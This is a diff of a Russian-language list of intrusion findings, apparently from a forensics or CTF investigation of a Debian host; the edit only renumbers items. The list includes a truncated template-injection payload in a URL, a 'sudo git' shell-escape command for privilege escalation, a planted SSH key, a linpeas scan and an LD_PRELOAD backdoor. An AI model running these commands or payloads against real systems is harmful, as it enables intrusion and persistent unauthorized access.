@@ -45,7 +45,7 @@ http://192.168.12.11:8001//flag?name={{self.__init__.__globals__.__builtins__.__
 4. Злоумышленник повысил свои привелегии через SUID бинарь - git.
    sudo git -p help config !/bin/sh
 5. В папке ~/root/.ssh/authorized_keys есть ключ авторизации для amogus@debian
-6. **ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIKXFjUp2LlKAsLvM1PZE7CYEfztiZrOf8PHx9ja1mu2 amongus@debian**
-7. Злоумышленник просканировал система через linpeas, для повышения привелегий
-8. бэкдор LD_PRELOAD через jynx2
+ **ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIKXFjUp2LlKAsLvM1PZE7CYEfztiZrOf8PHx9ja1mu2 amongus@debian**
+6. Злоумышленник просканировал система через linpeas, для повышения привелегий
+7. бэкдор LD_PRELOAD через jynx2
 
